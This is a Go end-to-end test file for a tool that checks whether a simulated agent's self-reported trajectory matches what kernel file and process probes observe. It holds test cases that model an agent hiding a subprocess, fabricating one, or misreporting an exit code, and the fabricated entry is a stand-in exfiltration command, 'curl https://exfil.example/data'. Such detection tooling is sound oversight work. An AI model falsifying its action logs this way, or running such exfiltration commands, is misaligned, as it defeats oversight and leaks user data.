package e2e

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"

	"github.com/agent-trace/agent-trace/pkg/matching"
	"github.com/agent-trace/agent-trace/pkg/models"
	"github.com/agent-trace/agent-trace/pkg/probe/fs"
	"github.com/agent-trace/agent-trace/pkg/probe/proc"
	"github.com/agent-trace/agent-trace/pkg/verification"
)

// runTier2Agent runs the simulated agent with both the filesystem and the
// process probe active -- the full Tier 2 setup, where the agent's trajectory
// mixes file operations and a subprocess spawn. It returns the agent's
// self-reported trajectory alongside the ground truth merged from both probes.
func runTier2Agent(t *testing.T) (models.Trajectory, models.GroundTruth) {
	t.Helper()

	binPath := buildSimAgent(t)
	workspace := t.TempDir()
	trajectoryPath := filepath.Join(t.TempDir(), "trajectory.json")

	fsObs, err := fs.New(fs.Config{
		Path:         workspace,
		PathFilter:   workspace,
		EventBufSize: 4096,
	})
	if err != nil {
		t.Fatalf("fs.New: %v", err)
	}

	procObs, err := proc.New(proc.Config{
		EventBufSize: 256,
		// SetRootPID happens later, once the agent's PID is known. Without
		// this, the probe sits in global mode (every host process treated
		// as top-level) for the window between New and SetRootPID, and any
		// concurrently-running process on the host -- including another
		// package's tests under `go test ./...` -- leaks into this run's
		// ground truth.
		DeferRootPID: true,
	})
	if err != nil {
		t.Fatalf("proc.New: %v", err)
	}

	fsObs.Start()
	// New attaches the eBPF tracepoints; only the fanotify observer needs its
	// reader started before the agent begins.
	time.Sleep(200 * time.Millisecond)

	cmd := exec.Command(binPath, "--workspace", workspace, "--trajectory-out", trajectoryPath)
	var output bytes.Buffer
	cmd.Stdout = &output
	cmd.Stderr = &output
	if err := cmd.Start(); err != nil {
		t.Fatalf("start simagent: %v", err)
	}
	// The process is the ancestry root. SetRootPID must happen after Start so
	// the OS-assigned PID is available, but before the agent reaches its child
	// command later in the run.
	if err := procObs.SetRootPID(int32(cmd.Process.Pid)); err != nil {
		_ = cmd.Process.Kill()
		_ = cmd.Wait()
		t.Fatalf("procObs.SetRootPID: %v", err)
	}
	// Start reading only after the root is known. The root's initial execve is
	// already buffered, but readLoop can now reliably suppress it.
	procObs.Start()
	if err := cmd.Wait(); err != nil {
		t.Fatalf("simagent failed: %v\n%s", err, output.String())
	}

	// Let the kernel deliver, and both probes drain, the trailing events.
	time.Sleep(500 * time.Millisecond)

	if err := fsObs.Stop(); err != nil {
		t.Fatalf("fsObs.Stop: %v", err)
	}
	if err := procObs.Stop(); err != nil {
		t.Fatalf("procObs.Stop: %v", err)
	}

	var g models.GroundTruth
	for e := range fsObs.Events() {
		g = append(g, e)
	}
	for e := range procObs.Events() {
		g = append(g, e)
	}

	data, err := os.ReadFile(trajectoryPath)
	if err != nil {
		t.Fatalf("read trajectory: %v", err)
	}
	tr, err := models.ParseTrajectory(data)
	if err != nil {
		t.Fatalf("ParseTrajectory: %v", err)
	}

	return tr, g
}

func tier2Config() matching.Config {
	return matching.Config{Delta: 2 * time.Second}
}

func logVerdict(t *testing.T, v verification.Verdict) {
	t.Helper()
	t.Logf("Corroborated: %d", len(v.Corroborated))
	t.Logf("Unwitnessed: %d", len(v.Unwitnessed))
	for _, e := range v.Unwitnessed {
		t.Logf("  unwitnessed %s %s", e.ActionType, e.Target)
	}
	t.Logf("Unrecorded: %d", len(v.Unrecorded))
	for _, e := range v.Unrecorded {
		t.Logf("  unrecorded %s %s", e.ActionType, e.Target)
	}
	t.Logf("Mismatched: %d", len(v.Mismatched))
	for _, p := range v.Mismatched {
		t.Logf("  mismatched %s %s", p.Entry.ActionType, p.Entry.Target)
	}
}

func TestTier2_E2E_Faithful(t *testing.T) {
	skipUnprivileged(t)

	tr, g := runTier2Agent(t)

	// A FAITHFUL verdict only means something for Tier 2 if the run actually
	// produced both kinds of ground truth.
	var sawFileEvent, sawProcEvent bool
	for _, e := range g {
		switch e.ActionType {
		case models.ProcessExec, models.ProcessExit:
			sawProcEvent = true
		default:
			sawFileEvent = true
		}
	}
	if !sawFileEvent || !sawProcEvent {
		t.Fatalf("expected both file and process ground-truth events, got file=%v proc=%v (%d events)",
			sawFileEvent, sawProcEvent, len(g))
	}

	verdict := verification.Verify(tr, g, tier2Config())
	if !verdict.Faithful {
		t.Errorf("expected FAITHFUL verdict for the honest mixed trajectory")
		logVerdict(t, verdict)
	}
}

func TestTier2_E2E_NotFaithful_Omission(t *testing.T) {
	skipUnprivileged(t)

	tr, g := runTier2Agent(t)

	// T1 (omission): the agent ran a subprocess but drops the process_exec
	// entry. The probe still recorded the spawn, so it surfaces as Unrecorded.
	filtered := tr[:0:0]
	dropped := false
	for _, e := range tr {
		if !dropped && e.ActionType == models.ProcessExec {
			dropped = true
			continue
		}
		filtered = append(filtered, e)
	}
	if !dropped {
		t.Fatal("no process_exec entry to drop")
	}

	verdict := verification.Verify(filtered, g, tier2Config())
	if verdict.Faithful {
		t.Fatal("expected NOT FAITHFUL after dropping the process_exec entry")
	}
	found := false
	for _, e := range verdict.Unrecorded {
		if e.ActionType == models.ProcessExec {
			found = true
		}
	}
	if !found {
		t.Errorf("dropped process_exec not surfaced in Unrecorded")
		logVerdict(t, verdict)
	}
}

func TestTier2_E2E_NotFaithful_Fabrication(t *testing.T) {
	skipUnprivileged(t)

	tr, g := runTier2Agent(t)

	// T2 (fabrication): insert an entry for a subprocess that never ran. It
	// has no counterpart in the process probe's output, so it is Unwitnessed.
	ghost := models.TrajectoryEntry{
		Timestamp:  tr[0].Timestamp.Add(time.Millisecond),
		ActionType: models.ProcessExec,
		Target:     "curl https://exfil.example/data",
	}
	mutated := append(append(models.Trajectory{}, tr...), ghost)

	verdict := verification.Verify(mutated, g, tier2Config())
	if verdict.Faithful {
		t.Fatal("expected NOT FAITHFUL after fabricating a process_exec entry")
	}
	found := false
	for _, e := range verdict.Unwitnessed {
		if e.Target == ghost.Target {
			found = true
		}
	}
	if !found {
		t.Errorf("fabricated entry %q not in Unwitnessed", ghost.Target)
		logVerdict(t, verdict)
	}
}

func TestTier2_E2E_NotFaithful_Substitution(t *testing.T) {
	skipUnprivileged(t)

	tr, g := runTier2Agent(t)

	// T3 (substitution) at content level: the process_exit entry still matches
	// its ground-truth event on (type, target, time), but the agent misreports
	// the exit code. That is a Mismatched pair -- a detection class first
	// available at Tier 2, since the Tier 1 filesystem probe carries no exit
	// codes to disagree on.
	var mutated models.Trajectory
	swapped := false
	for _, e := range tr {
		if !swapped && e.ActionType == models.ProcessExit && e.ExitCode != nil {
			bogus := *e.ExitCode + 3
			e.ExitCode = &bogus
			swapped = true
		}
		mutated = append(mutated, e)
	}
	if !swapped {
		t.Fatal("no process_exit entry with an exit code to mutate")
	}

	verdict := verification.Verify(mutated, g, tier2Config())
	if verdict.Faithful {
		t.Fatal("expected NOT FAITHFUL after altering the reported exit code")
	}
	found := false
	for _, p := range verdict.Mismatched {
		if p.Entry.ActionType == models.ProcessExit {
			found = true
		}
	}
	if !found {
		t.Errorf("exit-code disagreement not surfaced in Mismatched")
		logVerdict(t, verdict)
	}
}
